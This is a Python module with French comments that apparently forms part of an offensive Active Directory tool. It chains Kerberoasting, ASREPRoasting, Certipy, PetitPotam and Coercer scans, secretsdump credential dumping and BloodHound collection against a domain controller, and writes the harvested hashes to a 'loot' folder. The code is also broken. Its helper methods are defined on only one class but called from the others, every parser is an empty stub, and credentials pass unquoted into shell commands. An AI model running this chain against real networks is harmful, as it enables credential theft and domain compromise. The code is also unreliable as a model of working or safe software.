#!/usr/bin/env python3

"""
WinRecon Techniques Module
Implémente les techniques spécialisées basées sur les mindmaps Orange Cyberdefense

Catégories principales:
- Initial Access & Enumeration
- Privilege Escalation
- Lateral Movement  
- Persistence
- Certificate Services (ADCS)
- Coercion Attacks
- Post-Exploitation
"""

import asyncio
import json
import logging
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
import re

@dataclass
class ADUser:
    """Représente un utilisateur Active Directory"""
    username: str
    domain: str
    full_name: Optional[str] = None
    description: Optional[str] = None
    groups: List[str] = None
    spn: Optional[str] = None
    password_last_set: Optional[str] = None
    last_logon: Optional[str] = None
    admin_count: Optional[int] = None
    kerberos_preauth: bool = True
    
    def __post_init__(self):
        if self.groups is None:
            self.groups = []

@dataclass
class ADComputer:
    """Représente un ordinateur Active Directory"""
    name: str
    domain: str
    os: Optional[str] = None
    os_version: Optional[str] = None
    dns_hostname: Optional[str] = None
    description: Optional[str] = None
    delegation: Optional[str] = None
    
@dataclass
class ADGroup:
    """Représente un groupe Active Directory"""
    name: str
    domain: str
    description: Optional[str] = None
    members: List[str] = None
    
    def __post_init__(self):
        if self.members is None:
            self.members = []

class ADEnumerationTechniques:
    """Techniques d'énumération Active Directory avancées"""
    
    def __init__(self, config: Dict, target_dir: Path, logger: logging.Logger):
        self.config = config
        self.target_dir = target_dir
        self.logger = logger
        self.domain = config.get('domain')
        self.username = config.get('username')
        self.password = config.get('password')
        self.hash = config.get('hash')
        self.dc_ip = config.get('dc_ip')
        
    async def enumerate_users_detailed(self, target_ip: str) -> List[ADUser]:
        """Énumération détaillée des utilisateurs AD"""
        self.logger.info("Starting detailed AD user enumeration")
        
        users = []
        commands = []
        
        if self.domain and self.username and (self.password or self.hash):
            # windapsearch pour énumération complète
            windap_cmd = self._build_windapsearch_cmd(target_ip, [
                "-U", "--full", "--attrs", 
                "sAMAccountName,displayName,description,memberOf,servicePrincipalName,pwdLastSet,lastLogon,adminCount,userAccountControl"
            ])
            commands.append(("windapsearch_users", windap_cmd))
            
            # ldapdomaindump pour format structuré
            ldapdd_cmd = self._build_ldapdomaindump_cmd(target_ip)
            commands.append(("ldapdomaindump", ldapdd_cmd))
            
            # Recherche d'utilisateurs avec SPN (Kerberoasting)
            spn_cmd = f"{self.config['tools']['impacket-GetUserSPNs']} {self.domain}/{self.username}"
            if self.password:
                spn_cmd += f":{self.password}"
            elif self.hash:
                spn_cmd += f" -hashes {self.hash}"
            spn_cmd += f" -dc-ip {target_ip} -request"
            commands.append(("kerberoast_spns", spn_cmd))
            
            # Recherche d'utilisateurs sans pré-auth Kerberos (ASREPRoasting)
            asrep_cmd = f"{self.config['tools']['impacket-GetNPUsers']} {self.domain}/"
            if self.username:
                asrep_cmd += f" -usersfile {self.config['wordlists']['usernames']}"
            asrep_cmd += f" -dc-ip {target_ip} -format hashcat"
            commands.append(("asrep_roast", asrep_cmd))
        
        # Exécuter les commandes
        for cmd_name, command in commands:
            output_file = self.target_dir / 'scans' / 'ldap' / f'{cmd_name}.txt'
            result = await self._run_command(command, output_file)
            
            if cmd_name == "windapsearch_users" and result.get('stdout'):
                users.extend(self._parse_windapsearch_users(result['stdout']))
        
        return users
    
    async def enumerate_groups_detailed(self, target_ip: str) -> List[ADGroup]:
        """Énumération détaillée des groupes AD"""
        self.logger.info("Starting detailed AD group enumeration")
        
        groups = []
        
        if self.domain and self.username and (self.password or self.hash):
            # Énumération des groupes privilégiés
            privileged_groups = [
                "Domain Admins", "Enterprise Admins", "Schema Admins",
                "Account Operators", "Backup Operators", "Print Operators",
                "Server Operators", "Group Policy Creator Owners",
                "DNSAdmins", "DnsAdmins"
            ]
            
            for group in privileged_groups:
                windap_cmd = self._build_windapsearch_cmd(target_ip, [
                    "-G", "-g", f'"{group}"', "--full"
                ])
                
                output_file = self.target_dir / 'scans' / 'ldap' / f'group_{group.replace(" ", "_")}.txt'
                result = await self._run_command(windap_cmd, output_file)
                
                if result.get('stdout'):
                    group_obj = self._parse_windapsearch_group(result['stdout'], group)
                    if group_obj:
                        groups.append(group_obj)
        
        return groups
    
    async def enumerate_computers_detailed(self, target_ip: str) -> List[ADComputer]:
        """Énumération détaillée des ordinateurs AD"""
        self.logger.info("Starting detailed AD computer enumeration")
        
        computers = []
        
        if self.domain and self.username and (self.password or self.hash):
            # Énumération complète des ordinateurs
            windap_cmd = self._build_windapsearch_cmd(target_ip, [
                "-C", "--full", "--attrs",
                "dNSHostName,operatingSystem,operatingSystemVersion,description,userAccountControl,servicePrincipalName"
            ])
            
            output_file = self.target_dir / 'scans' / 'ldap' / 'computers_detailed.txt'
            result = await self._run_command(windap_cmd, output_file)
            
            if result.get('stdout'):
                computers.extend(self._parse_windapsearch_computers(result['stdout']))
            
            # Recherche d'ordinateurs avec délégation non contrainte
            unconstrained_cmd = self._build_windapsearch_cmd(target_ip, [
                "--unconstrained", "-C"
            ])
            
            output_file = self.target_dir / 'scans' / 'ldap' / 'unconstrained_delegation.txt'
            await self._run_command(unconstrained_cmd, output_file)
        
        return computers

class KerberosTechniques:
    """Techniques d'attaque Kerberos spécialisées"""
    
    def __init__(self, config: Dict, target_dir: Path, logger: logging.Logger):
        self.config = config
        self.target_dir = target_dir
        self.logger = logger
        
    async def asrep_roasting(self, target_ip: str, users: List[str]) -> Dict:
        """Attaque ASREPRoasting contre les utilisateurs sans pré-auth"""
        self.logger.info("Starting ASREPRoasting attack")
        
        results = {
            'vulnerable_users': [],
            'hashes': [],
            'recommendations': []
        }
        
        # Créer un fichier temporaire avec la liste des utilisateurs
        users_file = self.target_dir / 'temp_users.txt'
        with open(users_file, 'w') as f:
            for user in users:
                f.write(f"{user}\n")
        
        # Commande ASREPRoasting
        asrep_cmd = (f"{self.config['tools']['impacket-GetNPUsers']} "
                    f"{self.config['domain']}/ -usersfile {users_file} "
                    f"-format hashcat -outputfile {self.target_dir}/loot/credentials/asrep_hashes.txt "
                    f"-dc-ip {target_ip}")
        
        result = await self._run_command(asrep_cmd)
        
        if result.get('stdout'):
            hashes = self._parse_asrep_hashes(result['stdout'])
            results['hashes'] = hashes
            results['vulnerable_users'] = [h['user'] for h in hashes]
            
            if hashes:
                results['recommendations'].append(
                    "Utilisateurs vulnérables à ASREPRoasting détectés. "
                    "Recommandation: Activer la pré-authentification Kerberos pour ces comptes."
                )
        
        # Nettoyer le fichier temporaire
        users_file.unlink(missing_ok=True)
        
        return results
    
    async def kerberoasting(self, target_ip: str) -> Dict:
        """Attaque Kerberoasting contre les comptes de service"""
        self.logger.info("Starting Kerberoasting attack")
        
        results = {
            'service_accounts': [],
            'tickets': [],
            'recommendations': []
        }
        
        if not (self.config.get('username') and (self.config.get('password') or self.config.get('hash'))):
            return results
        
        # Commande Kerberoasting
        kerb_cmd = f"{self.config['tools']['impacket-GetUserSPNs']} {self.config['domain']}/{self.config['username']}"
        
        if self.config.get('password'):
            kerb_cmd += f":{self.config['password']}"
        elif self.config.get('hash'):
            kerb_cmd += f" -hashes {self.config['hash']}"
        
        kerb_cmd += f" -dc-ip {target_ip} -request -outputfile {self.target_dir}/loot/credentials/kerberoast_tickets.txt"
        
        result = await self._run_command(kerb_cmd)
        
        if result.get('stdout'):
            tickets = self._parse_kerberoast_tickets(result['stdout'])
            results['tickets'] = tickets
            results['service_accounts'] = [t['user'] for t in tickets]
            
            if tickets:
                results['recommendations'].append(
                    "Comptes de service avec SPN détectés. "
                    "Recommandation: Utiliser des mots de passe complexes et changer régulièrement."
                )
        
        return results

class ADCSTechniques:
    """Techniques d'attaque Active Directory Certificate Services"""
    
    def __init__(self, config: Dict, target_dir: Path, logger: logging.Logger):
        self.config = config
        self.target_dir = target_dir
        self.logger = logger
        
    async def enumerate_certificate_authorities(self, target_ip: str) -> Dict:
        """Énumération des autorités de certification"""
        self.logger.info("Enumerating Certificate Authorities")
        
        results = {
            'cas': [],
            'templates': [],
            'vulnerabilities': []
        }
        
        if not (self.config.get('username') and (self.config.get('password') or self.config.get('hash'))):
            return results
        
        # Utiliser Certipy pour l'énumération
        certipy_cmd = f"{self.config['tools']['certipy']} find -u {self.config['username']}"
        
        if self.config.get('password'):
            certipy_cmd += f" -p {self.config['password']}"
        elif self.config.get('hash'):
            certipy_cmd += f" -hashes {self.config['hash']}"
        
        certipy_cmd += f" -target {target_ip} -output {self.target_dir}/loot/adcs_enum"
        
        result = await self._run_command(certipy_cmd)
        
        if result.get('stdout'):
            results = self._parse_certipy_output(result['stdout'])
        
        return results
    
    async def check_esc_vulnerabilities(self, target_ip: str) -> Dict:
        """Vérification des vulnérabilités ESC1-ESC8"""
        self.logger.info("Checking for ESC vulnerabilities")
        
        vulnerabilities = {
            'esc1': [],
            'esc2': [],
            'esc3': [],
            'esc4': [],
            'esc6': [],
            'esc7': [],
            'esc8': []
        }
        
        # Cette fonction nécessiterait une analyse détaillée des templates
        # Pour l'instant, on utilise Certipy qui peut détecter certaines vulnérabilités
        
        return vulnerabilities

class CoercionTechniques:
    """Techniques de coercition pour forcer l'authentification"""
    
    def __init__(self, config: Dict, target_dir: Path, logger: logging.Logger):
        self.config = config
        self.target_dir = target_dir
        self.logger = logger
        
    async def petitpotam_scan(self, target_ip: str) -> Dict:
        """Scan PetitPotam pour la coercition NTLM"""
        self.logger.info(f"Running PetitPotam scan against {target_ip}")
        
        results = {
            'vulnerable': False,
            'methods': [],
            'recommendations': []
        }
        
        # Scan PetitPotam (mode scan uniquement)
        petitpotam_cmd = (f"python3 {self.config['tools']['petitpotam']} "
                         f"-scan {target_ip}")
        
        result = await self._run_command(petitpotam_cmd)
        
        if result.get('stdout'):
            if "vulnerable" in result['stdout'].lower():
                results['vulnerable'] = True
                results['recommendations'].append(
                    "Serveur vulnérable à PetitPotam. "
                    "Recommandation: Appliquer les correctifs de sécurité Microsoft."
                )
        
        return results
    
    async def coercer_scan(self, target_ip: str) -> Dict:
        """Scan avec Coercer pour multiple techniques de coercition"""
        self.logger.info(f"Running Coercer scan against {target_ip}")
        
        results = {
            'techniques': [],
            'vulnerable_services': []
        }
        
        if not (self.config.get('username') and (self.config.get('password') or self.config.get('hash'))):
            return results
        
        # Scan Coercer
        coercer_cmd = f"python3 {self.config['tools']['coercer']} scan -t {target_ip}"
        
        if self.config.get('username'):
            coercer_cmd += f" -u {self.config['username']}"
        if self.config.get('password'):
            coercer_cmd += f" -p {self.config['password']}"
        elif self.config.get('hash'):
            coercer_cmd += f" --hashes {self.config['hash']}"
        
        result = await self._run_command(coercer_cmd)
        
        if result.get('stdout'):
            results = self._parse_coercer_output(result['stdout'])
        
        return results

class PostExploitationTechniques:
    """Techniques de post-exploitation"""
    
    def __init__(self, config: Dict, target_dir: Path, logger: logging.Logger):
        self.config = config
        self.target_dir = target_dir
        self.logger = logger
        
    async def secretsdump(self, target_ip: str) -> Dict:
        """Dump des secrets avec Impacket"""
        self.logger.info("Running secretsdump")
        
        results = {
            'hashes': [],
            'kerberos_keys': [],
            'cached_credentials': []
        }
        
        if not (self.config.get('username') and (self.config.get('password') or self.config.get('hash'))):
            return results
        
        # Commande secretsdump
        secrets_cmd = f"{self.config['tools']['impacket-secretsdump']} {self.config['domain']}/{self.config['username']}"
        
        if self.config.get('password'):
            secrets_cmd += f":{self.config['password']}"
        elif self.config.get('hash'):
            secrets_cmd += f" -hashes {self.config['hash']}"
        
        secrets_cmd += f"@{target_ip} -outputfile {self.target_dir}/loot/credentials/secretsdump"
        
        result = await self._run_command(secrets_cmd)
        
        if result.get('stdout'):
            results = self._parse_secretsdump_output(result['stdout'])
        
        return results
    
    async def bloodhound_collection(self, target_ip: str) -> Dict:
        """Collection BloodHound pour analyse des chemins d'attaque"""
        self.logger.info("Running BloodHound data collection")
        
        results = {
            'files_created': [],
            'nodes_collected': 0,
            'edges_collected': 0
        }
        
        if not (self.config.get('username') and (self.config.get('password') or self.config.get('hash'))):
            return results
        
        # Collection BloodHound
        bh_cmd = f"{self.config['tools']['bloodhound']} -u {self.config['username']}"
        
        if self.config.get('password'):
            bh_cmd += f" -p {self.config['password']}"
        elif self.config.get('hash'):
            bh_cmd += f" --hashes {self.config['hash']}"
        
        bh_cmd += (f" -d {self.config['domain']} -ns {target_ip} "
                  f"-c All,GPOLocalGroup --zip -o {self.target_dir}/loot/bloodhound/")
        
        result = await self._run_command(bh_cmd)
        
        if result.get('stdout'):
            results = self._parse_bloodhound_output(result['stdout'])
        
        return results

class TechniquesOrchestrator:
    """Orchestrateur principal pour toutes les techniques"""
    
    def __init__(self, config: Dict, target_dir: Path, logger: logging.Logger):
        self.config = config
        self.target_dir = target_dir
        self.logger = logger
        
        # Initialiser les modules de techniques
        self.ad_enum = ADEnumerationTechniques(config, target_dir, logger)
        self.kerberos = KerberosTechniques(config, target_dir, logger)
        self.adcs = ADCSTechniques(config, target_dir, logger)
        self.coercion = CoercionTechniques(config, target_dir, logger)
        self.postexploit = PostExploitationTechniques(config, target_dir, logger)
        
    async def run_comprehensive_enumeration(self, target_ip: str) -> Dict:
        """Exécute une énumération complète selon le mindmap OCD"""
        self.logger.info(f"Starting comprehensive AD enumeration for {target_ip}")
        
        results = {
            'target': target_ip,
            'timestamp': str(asyncio.get_event_loop().time()),
            'enumeration': {},
            'attacks': {},
            'vulnerabilities': [],
            'recommendations': []
        }
        
        try:
            # Phase 1: Énumération détaillée
            self.logger.info("Phase 1: Detailed enumeration")
            
            users = await self.ad_enum.enumerate_users_detailed(target_ip)
            groups = await self.ad_enum.enumerate_groups_detailed(target_ip)
            computers = await self.ad_enum.enumerate_computers_detailed(target_ip)
            
            results['enumeration'] = {
                'users': len(users),
                'groups': len(groups),
                'computers': len(computers),
                'user_details': [u.__dict__ for u in users],
                'group_details': [g.__dict__ for g in groups],
                'computer_details': [c.__dict__ for c in computers]
            }
            
            # Phase 2: Attaques Kerberos
            self.logger.info("Phase 2: Kerberos attacks")
            
            usernames = [u.username for u in users]
            asrep_results = await self.kerberos.asrep_roasting(target_ip, usernames)
            kerberoast_results = await self.kerberos.kerberoasting(target_ip)
            
            results['attacks']['kerberos'] = {
                'asrep_roasting': asrep_results,
                'kerberoasting': kerberoast_results
            }
            
            # Phase 3: ADCS (si configuré)
            if self.config.get('advanced_techniques', {}).get('adcs', {}).get('enabled', False):
                self.logger.info("Phase 3: ADCS enumeration")
                
                ca_results = await self.adcs.enumerate_certificate_authorities(target_ip)
                esc_results = await self.adcs.check_esc_vulnerabilities(target_ip)
                
                results['attacks']['adcs'] = {
                    'certificate_authorities': ca_results,
                    'esc_vulnerabilities': esc_results
                }
            
            # Phase 4: Techniques de coercition (si configuré)
            if self.config.get('advanced_techniques', {}).get('coercion', {}).get('enabled', False):
                self.logger.info("Phase 4: Coercion techniques")
                
                petitpotam_results = await self.coercion.petitpotam_scan(target_ip)
                coercer_results = await self.coercion.coercer_scan(target_ip)
                
                results['attacks']['coercion'] = {
                    'petitpotam': petitpotam_results,
                    'coercer': coercer_results
                }
            
            # Phase 5: Post-exploitation (si configuré)
            if self.config.get('advanced_techniques', {}).get('lateral_movement', {}).get('enabled', False):
                self.logger.info("Phase 5: Post-exploitation")
                
                secrets_results = await self.postexploit.secretsdump(target_ip)
                bh_results = await self.postexploit.bloodhound_collection(target_ip)
                
                results['attacks']['postexploit'] = {
                    'secretsdump': secrets_results,
                    'bloodhound': bh_results
                }
            
            # Génération des recommandations
            results['recommendations'] = self._generate_recommendations(results)
            
        except Exception as e:
            self.logger.error(f"Error during comprehensive enumeration: {e}")
            results['error'] = str(e)
        
        return results
    
    def _generate_recommendations(self, results: Dict) -> List[str]:
        """Génère des recommandations basées sur les résultats"""
        recommendations = []
        
        # Analyser les résultats pour générer des recommandations
        if 'attacks' in results:
            kerberos_attacks = results['attacks'].get('kerberos', {})
            
            # ASREPRoasting
            if kerberos_attacks.get('asrep_roasting', {}).get('vulnerable_users'):
                recommendations.append(
                    "CRITIQUE: Utilisateurs vulnérables à ASREPRoasting détectés. "
                    "Activer la pré-authentification Kerberos pour tous les comptes utilisateur."
                )
            
            # Kerberoasting
            if kerberos_attacks.get('kerberoasting', {}).get('service_accounts'):
                recommendations.append(
                    "ATTENTION: Comptes de service avec SPN détectés. "
                    "Utiliser des mots de passe complexes (>25 caractères) et gMSA."
                )
            
            # ADCS
            adcs_attacks = results['attacks'].get('adcs', {})
            if adcs_attacks.get('esc_vulnerabilities'):
                recommendations.append(
                    "CRITIQUE: Vulnérabilités ADCS détectées. "
                    "Réviser les templates de certificats et les permissions."
                )
            
            # Coercion
            coercion_attacks = results['attacks'].get('coercion', {})
            if coercion_attacks.get('petitpotam', {}).get('vulnerable'):
                recommendations.append(
                    "CRITIQUE: Serveur vulnérable aux attaques de coercition. "
                    "Appliquer les correctifs de sécurité et configurer EPA/SMB signing."
                )
        
        return recommendations
    
    async def _run_command(self, command: str, output_file: Optional[Path] = None) -> Dict:
        """Exécute une commande de manière asynchrone"""
        try:
            self.logger.debug(f"Executing: {command}")
            
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), 
                timeout=self.config.get('timeout', 3600)
            )
            
            result = {
                'command': command,
                'returncode': process.returncode,
                'stdout': stdout.decode('utf-8', errors='ignore'),
                'stderr': stderr.decode('utf-8', errors='ignore')
            }
            
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(result['stdout'])
                    
            return result
            
        except asyncio.TimeoutError:
            self.logger.error(f"Command timeout: {command}")
            return {'command': command, 'error': 'timeout'}
        except Exception as e:
            self.logger.error(f"Command failed: {command} - {e}")
            return {'command': command, 'error': str(e)}
    
    def _build_windapsearch_cmd(self, target_ip: str, options: List[str]) -> str:
        """Construit une commande windapsearch"""
        cmd = f"{self.config['tools']['windapsearch']} -d {self.config['domain']}"
        
        if self.config.get('username'):
            cmd += f" -u {self.config['username']}"
        if self.config.get('password'):
            cmd += f" -p {self.config['password']}"
        elif self.config.get('hash'):
            cmd += f" --hashes {self.config['hash']}"
        
        cmd += f" --dc-ip {target_ip}"
        cmd += " " + " ".join(options)
        
        return cmd
    
    def _build_ldapdomaindump_cmd(self, target_ip: str) -> str:
        """Construit une commande ldapdomaindump"""
        cmd = f"python3 {self.config['tools']['ldapdomaindump']} -u {self.config['domain']}\\{self.config['username']}"
        
        if self.config.get('password'):
            cmd += f" -p {self.config['password']}"
        
        cmd += f" -o {self.target_dir}/loot/ldapdomaindump/ {target_ip}"
        
        return cmd
    
    # Méthodes de parsing (simplifiées pour l'exemple)
    def _parse_windapsearch_users(self, output: str) -> List[ADUser]:
        """Parse la sortie windapsearch pour les utilisateurs"""
        users = []
        # Implémentation du parsing spécifique
        return users
    
    def _parse_windapsearch_group(self, output: str, group_name: str) -> Optional[ADGroup]:
        """Parse la sortie windapsearch pour un groupe"""
        # Implémentation du parsing spécifique
        return None
    
    def _parse_windapsearch_computers(self, output: str) -> List[ADComputer]:
        """Parse la sortie windapsearch pour les ordinateurs"""
        computers = []
        # Implémentation du parsing spécifique
        return computers
    
    def _parse_asrep_hashes(self, output: str) -> List[Dict]:
        """Parse les hashes ASREPRoast"""
        hashes = []
        # Implémentation du parsing spécifique
        return hashes
    
    def _parse_kerberoast_tickets(self, output: str) -> List[Dict]:
        """Parse les tickets Kerberoast"""
        tickets = []
        # Implémentation du parsing spécifique
        return tickets
    
    def _parse_certipy_output(self, output: str) -> Dict:
        """Parse la sortie Certipy"""
        results = {}
        # Implémentation du parsing spécifique
        return results
    
    def _parse_coercer_output(self, output: str) -> Dict:
        """Parse la sortie Coercer"""
        results = {}
        # Implémentation du parsing spécifique
        return results
    
    def _parse_secretsdump_output(self, output: str) -> Dict:
        """Parse la sortie secretsdump"""
        results = {}
        # Implémentation du parsing spécifique
        return results
    
    def _parse_bloodhound_output(self, output: str) -> Dict:
        """Parse la sortie BloodHound"""
        results = {}
        # Implémentation du parsing spécifique
        return results